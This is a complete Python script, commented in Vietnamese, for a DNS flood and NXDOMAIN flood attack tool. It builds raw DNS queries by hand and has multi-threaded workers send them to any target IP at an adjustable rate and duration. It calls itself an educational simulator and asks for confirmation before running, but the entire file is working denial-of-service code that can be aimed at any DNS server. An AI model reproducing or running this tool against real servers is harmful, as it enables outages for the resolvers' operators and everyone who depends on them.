#!/usr/bin/env python3
"""
DNS Flooder - Công cụ mô phỏng tấn công DNS Flood
Chỉ sử dụng cho mục đích học tập và nghiên cứu
"""

import socket
import random
import time
import threading
import argparse
from struct import pack
import sys

class DNSFlooder:
    def __init__(self, target_ip, target_port=53, threads=10, rate=100):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.rate = rate  # queries per second
        self.running = False
        
        # Danh sách domain để test
        self.test_domains = [
            'test.local',
            'www.test.local',
            'mail.test.local',
            'ftp.test.local',
            'web.test.local',
            'smtp.test.local'
        ]
        
        # Danh sách random domains để tạo NXDOMAIN
        self.random_domains = [
            'nonexistent.test.local',
            'fake.test.local',
            'invalid.test.local',
            'notfound.test.local'
        ]

    def create_dns_query(self, domain, query_type='A'):
        """Tạo DNS query packet"""
        # Transaction ID (2 bytes)
        transaction_id = pack('!H', random.randint(1, 65535))
        
        # Flags (2 bytes) - Standard query
        flags = pack('!H', 0x0100)
        
        # Questions, Answer RRs, Authority RRs, Additional RRs
        qdcount = pack('!H', 1)  # 1 question
        ancount = pack('!H', 0)  # 0 answers
        nscount = pack('!H', 0)  # 0 authority
        arcount = pack('!H', 0)  # 0 additional
        
        # Question section
        qname = b''
        for part in domain.split('.'):
            qname += pack('!B', len(part)) + part.encode()
        qname += b'\x00'  # End of name
        
        # Query type and class
        if query_type == 'A':
            qtype = pack('!H', 1)
        elif query_type == 'ANY':
            qtype = pack('!H', 255)
        elif query_type == 'MX':
            qtype = pack('!H', 15)
        else:
            qtype = pack('!H', 1)
            
        qclass = pack('!H', 1)  # IN class
        
        # Combine all parts
        query = transaction_id + flags + qdcount + ancount + nscount + arcount
        query += qname + qtype + qclass
        
        return query

    def flood_worker(self, worker_id):
        """Worker thread để gửi DNS queries"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        queries_sent = 0
        
        print(f"Worker {worker_id} started")
        
        while self.running:
            try:
                # Chọn domain ngẫu nhiên
                domain = random.choice(self.test_domains + self.random_domains)
                
                # Chọn query type ngẫu nhiên
                query_type = random.choice(['A', 'MX', 'ANY'])
                
                # Tạo DNS query
                query = self.create_dns_query(domain, query_type)
                
                # Gửi query
                sock.sendto(query, (self.target_ip, self.target_port))
                queries_sent += 1
                
                # Điều chỉnh tốc độ
                time.sleep(1.0 / (self.rate / self.threads))
                
                if queries_sent % 100 == 0:
                    print(f"Worker {worker_id}: Sent {queries_sent} queries")
                    
            except Exception as e:
                print(f"Worker {worker_id} error: {e}")
                time.sleep(1)
        
        sock.close()
        print(f"Worker {worker_id} stopped. Total queries sent: {queries_sent}")

    def start_flood(self, duration=60):
        """Bắt đầu tấn công flood"""
        print(f"Starting DNS flood attack on {self.target_ip}:{self.target_port}")
        print(f"Threads: {self.threads}, Rate: {self.rate} qps, Duration: {duration}s")
        
        self.running = True
        workers = []
        
        # Tạo worker threads
        for i in range(self.threads):
            worker = threading.Thread(target=self.flood_worker, args=(i,))
            workers.append(worker)
            worker.start()
        
        # Chạy trong thời gian được chỉ định
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\nStopping attack...")
        
        # Dừng tất cả workers
        self.running = False
        
        # Đợi tất cả workers kết thúc
        for worker in workers:
            worker.join()
        
        print("DNS flood attack completed")

class NXDOMAINFlooder:
    """Mô phỏng tấn công NXDOMAIN"""
    
    def __init__(self, target_ip, target_port=53, threads=5, rate=50):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.rate = rate
        self.running = False
        
    def generate_random_domain(self):
        """Tạo domain ngẫu nhiên để gây NXDOMAIN"""
        length = random.randint(5, 15)
        domain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=length))
        return f"{domain}.test.local"
    
    def create_dns_query(self, domain):
        """Tạo DNS query cho NXDOMAIN test"""
        transaction_id = pack('!H', random.randint(1, 65535))
        flags = pack('!H', 0x0100)
        qdcount = pack('!H', 1)
        ancount = pack('!H', 0)
        nscount = pack('!H', 0)
        arcount = pack('!H', 0)
        
        qname = b''
        for part in domain.split('.'):
            qname += pack('!B', len(part)) + part.encode()
        qname += b'\x00'
        
        qtype = pack('!H', 1)  # A record
        qclass = pack('!H', 1)  # IN class
        
        return transaction_id + flags + qdcount + ancount + nscount + arcount + qname + qtype + qclass
    
    def nxdomain_worker(self, worker_id):
        """Worker để gửi NXDOMAIN queries"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        queries_sent = 0
        
        print(f"NXDOMAIN Worker {worker_id} started")
        
        while self.running:
            try:
                # Tạo domain ngẫu nhiên
                domain = self.generate_random_domain()
                query = self.create_dns_query(domain)
                
                sock.sendto(query, (self.target_ip, self.target_port))
                queries_sent += 1
                
                time.sleep(1.0 / (self.rate / self.threads))
                
                if queries_sent % 50 == 0:
                    print(f"NXDOMAIN Worker {worker_id}: Sent {queries_sent} queries")
                    
            except Exception as e:
                print(f"NXDOMAIN Worker {worker_id} error: {e}")
                time.sleep(1)
        
        sock.close()
        print(f"NXDOMAIN Worker {worker_id} stopped. Total queries: {queries_sent}")
    
    def start_attack(self, duration=60):
        """Bắt đầu tấn công NXDOMAIN"""
        print(f"Starting NXDOMAIN flood attack on {self.target_ip}:{self.target_port}")
        
        self.running = True
        workers = []
        
        for i in range(self.threads):
            worker = threading.Thread(target=self.nxdomain_worker, args=(i,))
            workers.append(worker)
            worker.start()
        
        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\nStopping NXDOMAIN attack...")
        
        self.running = False
        
        for worker in workers:
            worker.join()
        
        print("NXDOMAIN attack completed")

def main():
    parser = argparse.ArgumentParser(description='DNS Attack Simulator')
    parser.add_argument('target', help='Target DNS server IP')
    parser.add_argument('--port', type=int, default=53, help='Target port (default: 53)')
    parser.add_argument('--type', choices=['flood', 'nxdomain', 'both'], default='flood',
                       help='Attack type')
    parser.add_argument('--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('--rate', type=int, default=100, help='Queries per second')
    parser.add_argument('--duration', type=int, default=60, help='Attack duration in seconds')
    
    args = parser.parse_args()
    
    print("="*60)
    print("DNS Attack Simulator - CHỈ DÙNG CHO MỤC ĐÍCH HỌC TẬP")
    print("="*60)
    print(f"Target: {args.target}:{args.port}")
    print(f"Attack type: {args.type}")
    print(f"Duration: {args.duration} seconds")
    print("="*60)
    
    # Xác nhận trước khi bắt đầu
    confirm = input("Bạn có chắc chắn muốn bắt đầu tấn công? (yes/no): ")
    if confirm.lower() != 'yes':
        print("Tấn công đã bị hủy.")
        return
    
    if args.type == 'flood' or args.type == 'both':
        flooder = DNSFlooder(args.target, args.port, args.threads, args.rate)
        flooder.start_flood(args.duration)
    
    if args.type == 'nxdomain' or args.type == 'both':
        if args.type == 'both':
            print("\nStarting NXDOMAIN attack...")
            time.sleep(2)
        
        nxdomain_flooder = NXDOMAINFlooder(args.target, args.port, 
                                          args.threads//2, args.rate//2)
        nxdomain_flooder.start_attack(args.duration)

if __name__ == '__main__':
    main()